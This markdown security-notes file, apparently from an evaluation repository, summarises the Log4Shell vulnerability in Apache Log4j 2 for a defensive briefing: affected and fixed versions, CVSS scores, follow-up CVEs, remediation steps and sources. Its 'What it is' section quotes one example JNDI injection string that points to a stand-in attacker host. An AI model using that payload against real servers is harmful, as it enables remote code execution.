# SECURITY-NOTES.md — Log4Shell (CVE-2021-44228)

> Research notes for the quarterly security briefing. Remediation actions are tracked as sub-issues of [Log4Shell remediation checklist (#1)](https://github.com/mcpmark-eval-liuhezi/log4shell-audit-1/issues/1).

## What it is

Log4Shell is a remote code execution vulnerability in **Apache Log4j 2** (`log4j-core`). Log4j's JNDI features — used in configurations, log messages, and message parameters — do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control logged strings (user-agent headers, form input, error messages, exception traces, etc.) can trigger a JNDI lookup like `${jndi:ldap://attacker.example/a}`, causing the vulnerable server to fetch and execute attacker-controlled code. Exploitation is trivial and it was weaponized within days of disclosure. Only `log4j-core` is affected — `log4j-api` alone is not, and log4net/log4cxx are not.

## Key facts

| Item | Detail |
| --- | --- |
| **CVE ID** | **CVE-2021-44228** |
| **Affected component** | `org.apache.logging.log4j:log4j-core` |
| **Affected versions** | **2.0-beta9 through 2.14.1**, i.e. `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)` |
| **Fixed version** | **2.15.0** (Java 8 and later) |
| **Fixed (backports)** | **2.12.2** (Java 7), **2.3.1** (Java 6) |
| **CVSS 3.1 score** | **10.0 CRITICAL** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (maximum possible score; also confirmed by CISA-ADP) |
| **CVSS 2.0** | 9.3 HIGH |
| **NVD published** | 2021-12-10 |
| **CISA KEV catalog** | Listed (added 2021-12-10; remediation due 2021-12-24) |
| **Discovered by** | Chen Zhaojun, Alibaba Cloud Security Team |

## Important caveats

- The **2.15.0 fix was incomplete** in certain non-default configurations, leading to follow-up CVEs: **CVE-2021-45046** (RCE/DoS, CVSS 9.0), **CVE-2021-45105** (DoS, CVSS 7.5), and **CVE-2021-44832** (RCE via config, CVSS 6.6). CISA urged upgrading to **2.17.1 (Java 8), 2.12.4 (Java 7), 2.3.2 (Java 6)**.
- The `log4j2.formatMsgNoLookups=true` system-property mitigation does **not** protect against CVE-2021-45046.
- **Log4j 1.x is end-of-life and unpatched** — it carries a separate issue (CVE-2021-4104 via `JMSAppender`) and should be migrated to Log4j 2.

## Remediation summary (details in checklist sub-issues)

1. **Upgrade** to the fixed versions above — patching is the preferred long-term option (CISA).
2. **Detect**: filesystem/host scanning for `log4j-core` (including nested copies in shaded JARs), CISA's Log4j vulnerable software database, and CERT/CC's `CVE-2021-44228_scanner`.
3. **Harden where upgrade is blocked**: `log4j2.formatMsgNoLookups=true` (2.10–2.14.1) or remove the `JndiLookup` class from the JAR (< 2.10). Temporary only.
4. **Automated scanning**: Dependabot / OWASP Dependency-Check / SCA tooling in CI, plus SBOMs.
5. **Review for compromise**: inspect logs for JNDI lookup patterns on any system that ran a vulnerable version.

## Sources

- [Apache Logging Services — Log4j Security Vulnerabilities](https://logging.apache.org/security.html) — authoritative affected/fixed version ranges and mitigation
- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) — CVSS 3.1 base score 10.0 CRITICAL, official description
- [CISA AA21-356A — Mitigating Log4Shell and Other Log4j-Related Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a) — detection and remediation guidance
- [CISA Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance) — long-term vulnerability management, recommended versions 2.17.1 / 2.12.4 / 2.3.2
- [CISA Emergency Directive 22-02](https://www.cisa.gov/news-events/news/emergency-directive-22-02-apache-log4j-recommended-mitigation-measures) — temporary mitigation measures
- [GitHub Advisory Database — GHSA-jfh8-c2jp-5v3q](https://github.com/advisories/ghsa-jfh8-c2jp-5v3q) — package-level affected version ranges
- [The ASF Blog — Apache Log4j CVEs](https://news.apache.org/foundation/entry/apache-log4j-cves) — release timeline for 2.15.0/2.16.0
